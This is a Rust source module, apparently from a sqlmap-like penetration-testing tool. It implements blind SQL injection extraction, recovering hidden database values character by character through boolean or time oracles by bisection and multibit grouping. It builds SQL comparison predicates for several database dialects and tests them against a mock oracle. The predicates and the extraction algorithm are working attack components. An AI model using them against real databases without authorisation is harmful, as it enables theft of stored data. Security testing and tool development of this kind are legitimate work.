//! Blind extraction: bit-by-bit / bisection recovery over an inference oracle.
//!
//! When neither UNION nor error text reflects a value, the value is recovered
//! one character at a time by asking the confirmed blind channel yes/no
//! questions — a body differential for boolean-blind, or a response delay for
//! time-blind. Both reduce to the [`BoolOracle`] trait, so the recovery
//! algorithm is identical and fully testable against an in-memory mock.
//!
//! [`infer_string_multibit`] is sqlmap's `multibit.py` analogue: where a
//! channel can answer a `k`-bit group in a single request (a value-returning
//! oracle), it recovers `ceil(8/k)` groups per character instead of ~8 boolean
//! comparisons. Recovery is hard-bounded by [`DEFAULT_MAX_LENGTH`] and, in the
//! live session, by the shared request budget.

use crate::detection::DbmsFamily;

/// Upper bound on a recovered string's length, so a mis-calibrated oracle can
/// never drive an unbounded request loop.
pub const DEFAULT_MAX_LENGTH: usize = 4096;

/// Highest character code the per-character bisection considers (Latin-1).
const CHARSET_HI: u32 = 255;

/// A yes/no oracle over the hidden value, answered through the blind channel.
pub trait BoolOracle {
    /// Is the character code at 1-based `pos` strictly greater than `value`?
    fn char_gt(&mut self, pos: usize, value: u32) -> bool;
    /// Is the string length strictly greater than `len`?
    fn len_gt(&mut self, len: usize) -> bool;
}

/// A richer oracle that returns a `bits`-wide group of a character code in one
/// request — the precondition for multibit recovery.
pub trait BitGroupOracle {
    /// Return `(code >> shift) & ((1 << bits) - 1)` for the char at 1-based `pos`.
    fn char_bits(&mut self, pos: usize, shift: u32, bits: u32) -> u32;
    /// Is the string length strictly greater than `len`?
    fn len_gt(&mut self, len: usize) -> bool;
}

/// Binary-search the length in `[0, max_len]` using a `len_gt` predicate:
/// `len` is the smallest `L` with `!len_gt(L)`.
fn binary_length(max_len: usize, mut len_gt: impl FnMut(usize) -> bool) -> usize {
    let (mut lo, mut hi) = (0usize, max_len);
    while lo < hi {
        let mid = (lo + hi) / 2;
        if len_gt(mid) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    lo
}

/// Recover one character code by bisection over `[0, CHARSET_HI]`.
fn recover_char(oracle: &mut dyn BoolOracle, pos: usize) -> u32 {
    let (mut lo, mut hi) = (0u32, CHARSET_HI);
    while lo < hi {
        let mid = (lo + hi) / 2;
        if oracle.char_gt(pos, mid) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    lo
}

/// Recover a string by boolean/time bisection: length first, then each
/// character. Bounded by `max_len`. ~`log2(256)` requests per character.
pub fn infer_string(oracle: &mut dyn BoolOracle, max_len: usize) -> String {
    let len = binary_length(max_len, |l| oracle.len_gt(l));
    let mut out = String::new();
    for pos in 1..=len {
        let code = recover_char(oracle, pos);
        if let Some(c) = char::from_u32(code) {
            out.push(c);
        }
    }
    out
}

/// Recover a string `bits` at a time over a [`BitGroupOracle`]. Reads
/// `ceil(8/bits)` groups per character, so for `bits = 4` a value comes back in
/// two requests per character instead of eight — the same value, fewer calls.
pub fn infer_string_multibit(oracle: &mut dyn BitGroupOracle, max_len: usize, bits: u32) -> String {
    let bits = bits.clamp(1, 8);
    let len = binary_length(max_len, |l| oracle.len_gt(l));
    let groups = (8 + bits - 1) / bits;
    let mask = if bits >= 32 { u32::MAX } else { (1u32 << bits) - 1 };
    let mut out = String::new();
    for pos in 1..=len {
        let mut code = 0u32;
        for g in 0..groups {
            let shift = g * bits;
            let part = oracle.char_bits(pos, shift, bits) & mask;
            code |= part << shift;
        }
        if let Some(c) = char::from_u32(code & 0xFF) {
            out.push(c);
        }
    }
    out
}

// ── dialect-aware live predicate builders ──────────────────────────────────
//
// The blind session renders these and classifies the response against a
// calibrated true/false fingerprint. Each is a read-only comparison over the
// real target expression — never a trivial `1=1`/`1=2` constant.

/// `SUBSTRING`/`SUBSTR` of the target expression at 1-based `pos`, one char.
fn substr_expr(dbms: DbmsFamily, expr: &str, pos: usize) -> String {
    use DbmsFamily::*;
    match dbms {
        PostgreSQL => format!("SUBSTRING(({expr}) FROM {pos} FOR 1)"),
        Oracle | SQLite => format!("SUBSTR(({expr}),{pos},1)"),
        _ => format!("SUBSTRING(({expr}),{pos},1)"),
    }
}

/// The character-code function name for the engine.
fn ord_fn(dbms: DbmsFamily) -> &'static str {
    use DbmsFamily::*;
    match dbms {
        MSSQL | Sybase | SQLite => "UNICODE",
        _ => "ASCII",
    }
}

/// `<ord>(<substr>) > value` — the boolean question `char_gt` asks live.
pub fn char_gt_predicate(dbms: DbmsFamily, expr: &str, pos: usize, value: u32) -> String {
    format!(
        "{}({})>{}",
        ord_fn(dbms),
        substr_expr(dbms, expr, pos),
        value
    )
}

/// `LENGTH((expr)) > len` (`LEN` on T-SQL) — the question `len_gt` asks live.
pub fn len_gt_predicate(dbms: DbmsFamily, expr: &str, len: usize) -> String {
    use DbmsFamily::*;
    let f = match dbms {
        MSSQL | Sybase => "LEN",
        _ => "LENGTH",
    };
    format!("{f}(({expr}))>{len}")
}

#[cfg(test)]
mod tests {
    use super::*;

    /// In-memory oracle over a known secret, counting the requests it answers.
    struct MockOracle<'a> {
        secret: &'a [u8],
        calls: usize,
    }

    impl<'a> MockOracle<'a> {
        fn new(secret: &'a str) -> Self {
            Self { secret: secret.as_bytes(), calls: 0 }
        }
        fn code_at(&self, pos: usize) -> u32 {
            self.secret.get(pos - 1).map(|b| *b as u32).unwrap_or(0)
        }
    }

    impl BoolOracle for MockOracle<'_> {
        fn char_gt(&mut self, pos: usize, value: u32) -> bool {
            self.calls += 1;
            self.code_at(pos) > value
        }
        fn len_gt(&mut self, len: usize) -> bool {
            self.calls += 1;
            self.secret.len() > len
        }
    }

    impl BitGroupOracle for MockOracle<'_> {
        fn char_bits(&mut self, pos: usize, shift: u32, bits: u32) -> u32 {
            self.calls += 1;
            let mask = (1u32 << bits) - 1;
            (self.code_at(pos) >> shift) & mask
        }
        fn len_gt(&mut self, len: usize) -> bool {
            self.calls += 1;
            self.secret.len() > len
        }
    }

    #[test]
    fn bisection_recovers_exact_value_within_bounded_requests() {
        let secret = "5.7.42-MySQL";
        let mut oracle = MockOracle::new(secret);
        let recovered = infer_string(&mut oracle, DEFAULT_MAX_LENGTH);
        assert_eq!(recovered, secret);
        // Length probe (~log2(4096)=12) + 8 comparisons per character is the
        // ceiling; assert we stayed under it.
        let ceiling = 12 + secret.len() * 8 + 4;
        assert!(oracle.calls <= ceiling, "used {} calls (ceiling {ceiling})", oracle.calls);
    }

    #[test]
    fn multibit_recovers_same_value_in_fewer_calls() {
        let secret = "current_db";
        let mut bisect = MockOracle::new(secret);
        let via_bisect = infer_string(&mut bisect, DEFAULT_MAX_LENGTH);

        let mut multi = MockOracle::new(secret);
        let via_multi = infer_string_multibit(&mut multi, DEFAULT_MAX_LENGTH, 4);

        assert_eq!(via_multi, secret);
        assert_eq!(via_multi, via_bisect);
        assert!(
            multi.calls < bisect.calls,
            "multibit used {} calls, bisection used {}",
            multi.calls,
            bisect.calls
        );
    }

    #[test]
    fn empty_value_recovers_empty_string() {
        let mut oracle = MockOracle::new("");
        assert_eq!(infer_string(&mut oracle, DEFAULT_MAX_LENGTH), "");
    }

    #[test]
    fn predicates_are_dialect_shaped_and_read_only() {
        let pg = char_gt_predicate(DbmsFamily::PostgreSQL, "version()", 3, 64);
        assert!(pg.contains("SUBSTRING((version()) FROM 3 FOR 1)"), "got {pg}");
        assert!(pg.starts_with("ASCII("), "got {pg}");

        let mssql = char_gt_predicate(DbmsFamily::MSSQL, "@@version", 1, 90);
        assert!(mssql.starts_with("UNICODE("), "got {mssql}");

        let len = len_gt_predicate(DbmsFamily::MSSQL, "db_name()", 10);
        assert_eq!(len, "LEN((db_name()))>10");

        // Every rendered predicate is a pure read.
        for sql in [pg, mssql, len] {
            assert!(matches!(
                crate::safety::is_extraction_read_only(&sql),
                crate::safety::SafetyVerdict::Permitted
            ));
        }
    }
}
